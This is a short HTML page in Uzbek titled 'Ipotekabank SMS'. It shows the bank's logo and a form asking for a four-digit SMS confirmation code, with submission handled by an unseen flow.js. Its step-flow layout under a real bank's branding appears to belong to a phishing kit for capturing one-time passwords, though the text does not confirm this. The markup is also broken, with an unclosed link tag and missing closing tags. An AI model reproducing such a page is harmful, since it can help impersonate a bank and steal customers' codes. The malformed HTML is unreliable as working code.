<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />

    <title>Ipotekabank SMS</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link

    <link rel="stylesheet" href="./styles.css" />

  <body data-screen="flow" data-step="sms">
    <div class="page-shell"></div>

    <main class="page">
      <section class="step-card">
        <a class="back-link" href="/services/ipoteka">←</a>

        <div class="logo-wrap step-logo" aria-label="Ipotekabank logo">
          <img class="logo-image" src="./img/logo.png" alt="Ipotekabank logo" />

        <header class="hero-copy step-copy">
          <h1>Tasdiqlash kodini kiriting</h1>
          </header>

        <form class="step-form" id="stepForm">
          <div class="otp-grid" id="otpGrid">
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
          </div>

          <button class="submit-btn secondary-btn" type="submit" id="submitStepButton">
            Davom etish
          </button>
          <p class="status" id="statusMessage" aria-live="polite"></p>
        </form>
      </section>
    </main>

    <script src="./flow.js"></script>
